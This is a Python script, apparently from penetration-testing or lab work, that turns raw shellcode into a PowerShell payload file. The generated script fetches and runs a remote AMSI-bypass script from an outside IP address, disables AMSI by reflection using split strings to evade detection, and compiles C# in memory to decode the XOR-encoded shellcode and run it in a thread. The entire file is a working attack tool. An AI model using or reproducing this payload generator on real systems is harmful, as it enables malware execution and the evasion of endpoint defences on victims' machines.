#!/usr/bin/env python3

import os
import sys
import re
from typing import Tuple, Optional

def read_shellcode_from_stdin() -> bytes:
    """Read and parse shellcode from stdin in C# byte array format."""
    try:
        # Read all input from stdin
        input_data = sys.stdin.read()
        
        # Extract the byte values using regex
        # Matches format: byte[] buf = new byte[511] {0xfc,0x48,...};
        match = re.search(r'{([^}]+)}', input_data)
        if not match:
            print("[-] Could not parse input. Raw input was:")
            print(input_data)
            sys.exit(1)
            
        # Get the comma-separated hex values
        hex_values = match.group(1).strip()
        
        # Split by comma and convert each hex string to int
        bytes_list = []
        for hex_str in hex_values.split(','):
            # Clean up the hex string and convert to int
            hex_clean = hex_str.strip().replace('0x', '')
            if hex_clean:  # Skip empty strings
                bytes_list.append(int(hex_clean, 16))
                
        return bytes(bytes_list)
                
    except Exception as e:
        print(f"[-] Error reading shellcode: {e}")
        sys.exit(1)

def xor_encode(data: bytes, key: Optional[bytes] = None) -> Tuple[bytes, bytes]:
    """XOR encode data with a single-byte key."""
    if key is None:
        key = os.urandom(1)
    encoded = bytes(b ^ key[0] for b in data)
    return encoded, key

def generate_powershell_template(encoded_shellcode: bytes, key: bytes) -> str:
    """Generate PowerShell script with the encoded shellcode."""
    # First, create a temporary file with the encoded shellcode
    encoded_shellcode_str = ", ".join(f"0x{b:02x}" for b in encoded_shellcode)
    key_hex = f"0x{key[0]:02x}"
    
    return f'''iex(new-object net.webclient).downloadString("http://10.10.14.146/amsi_bypasses/amsi-fail2.ps1")
write-host "Amsi Bypass done..."

# Splitting sensitive words into pieces
$part1 = 'Am'
$part2 = 'siUt'
$part3 = 'ils'
$typeNamePart = $part1 + $part2 + $part3

$partA = 'amsi'
$partB = 'Init'
$partC = 'Failed'
$fieldNamePart = $partA + $partB + $partC

# Load all assemblies and dynamically find the type
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$foundType = $null
foreach ($assembly in $assemblies) {{
    $types = $assembly.GetTypes()
    foreach ($type in $types) {{
        if ($type.Name -match $typeNamePart) {{
            $foundType = $type
            break
        }}
    }}
    if ($foundType) {{
        break
    }}
}}

# Access the field dynamically and set its value to disable AMSI
if ($foundType) {{
    $bindingFlags = [Reflection.BindingFlags] 'NonPublic,Static'
    $field = $foundType.GetField($fieldNamePart, $bindingFlags)
    if ($field) {{
        $field.SetValue($null, $true)
        Write-Host "AMSI bypass applied successfully."
    }} else {{
        Write-Host "Field not found."
    }}
}} else {{
    Write-Host "Type not found."
}}

start-sleep -seconds 3
## Shellcode Injector X0r

# PowerShell script to compile and execute C# code entirely in memory
$source = @"
using System;
using System.Runtime.InteropServices;

public class Program
{{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Main()
    {{
        byte[] shellcode = new byte[] {{ {encoded_shellcode_str} }};
        byte key = {key_hex}; // XOR key here

        // Decode the shellcode
        for (int i = 0; i < shellcode.Length; i++)
        {{
            shellcode[i] ^= key;
        }}

        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
        Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }}
}}
"@

# Compile and execute in memory using reflection
$provider = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.GenerateInMemory = $true
$params.ReferencedAssemblies.Add("System.dll")
$params.ReferencedAssemblies.Add("mscorlib.dll")
$params.CompilerOptions = "/optimize"

# Compile the code
$results = $provider.CompileAssemblyFromSource($params, $source)
if ($results.Errors.HasErrors) {{
    $results.Errors | foreach {{ Write-Error $_.ErrorText }}
}} else {{
    $assembly = $results.CompiledAssembly
    $type = $assembly.GetType("Program")
    $method = $type.GetMethod("Main")
    $method.Invoke($null, $null)
}}'''

def main():
    """Main entry point"""
    try:
        # Read and parse shellcode from stdin
        print("[+] Reading shellcode from stdin...")
        shellcode = read_shellcode_from_stdin()
        print(f"[+] Read {len(shellcode)} bytes of shellcode")

        print("[+] Encoding shellcode...")
        encoded_shellcode, key = xor_encode(shellcode)
        print(f"[+] Encoded with key: 0x{key[0]:02x}")

        # Generate final script
        print("[+] Generating PowerShell script...")
        ps_script = generate_powershell_template(encoded_shellcode, key)

        # Write output to run.ps1
        output_file = "run.ps1"
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(ps_script)
        
        print(f"[+] Written final payload to: {output_file}")

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
